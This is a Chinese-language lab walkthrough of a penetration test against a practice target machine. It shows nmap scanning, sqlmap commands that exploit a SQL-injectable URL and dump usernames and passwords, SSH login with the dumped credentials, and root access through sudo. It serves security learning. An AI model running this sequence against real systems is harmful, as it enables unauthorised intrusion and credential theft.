# 模拟环境

靶场下载地址点击跳转

攻击机IP：192.168.1.10

目标机IP：192.168.1.7

  

# 实战

使用NMAP扫描端口

```
nmap -Pn -sV -A 192.168.1.7
```

![](../Images/89a91defc96732ace2be8aeb49640728.png)

可以看到开放的端口有22-SSH、25-SMTP、80-HTTP。  

  

既然开放了80端口，那当然是先去看看80端口

![](../Images/c0a3d01999559554a4fa77f14b5d0f9b.png)

在浏览网页的过程中发现可能存在SQL注入的一个URL

```
http://192.168.1.7/index.html?page=blog&title=Blog&id=2
```

![](../Images/c63056b3b64775e86b78c17f7524fa32.png)

  

使用SQLMAP扫描

```
sqlmap -u "http://192.168.1.7/index.html?page=blog&title=Blog&id=2"
```

![](../Images/dc35886d0091c84023232de1bc03c070.png)

果然存在SQL注入  

  

爆库

```
sqlmap -u "http://192.168.1.7/index.html?page=blog&title=Blog&id=2" --dbs
```

![](../Images/e0e42e05c64765805329e160ec191c5b.png)

  

在爆表的过程中发现在ehks库中存在user表

```
sqlmap -u "http://192.168.1.7/index.html?page=blog&title=Blog&id=2" -D ehks --tables
```

![](../Images/bc72fdccfe21df1d003ba414dc34f720.png)

  

爆表

```
sqlmap -u "http://192.168.1.7/index.html?page=blog&title=Blog&id=2" -D ehks -T user --columns
```

![](../Images/95c950e5ecffb64b3f9be79af72fc6dc.png)

  

爆user\_name和user\_pass字段

```
sqlmap -u "http://192.168.1.7/index.html?page=blog&title=Blog&id=2" -D ehks -T user -C user\_name,user\_pass --dump
```

得到一些账号和密码

![](../Images/3b01c76dcf736ecddfefc3ae200932d3.png)

  

在前面的端口扫描中我们发现开放了22-SSH端口，尝试连接，连接成功！

![](../Images/f13424e51b72b6304f0abd1438369bc5.png)

  

查看当前权限

![](../Images/d44784cd026cfa5f50a485e083063683.png)

  

可以看到在这里我们只是普通用户的权限，尝试提权，输入：

```
sudo su
```

![](../Images/e1b997fafb0768ef6fe7f86527e3f0cd.png)

可以看到我们成功的拿到了root权限。  

  

# 总结

*   网络扫描（NMAP）
    
*   HTTP服务端口（80）
    
*   SQLMAP扫描
    
*   提取数据库和用户凭证
    
*   通过SSH登录到目标计算机
    
*   使用SUDO提权
    
*   取得Root访问权限
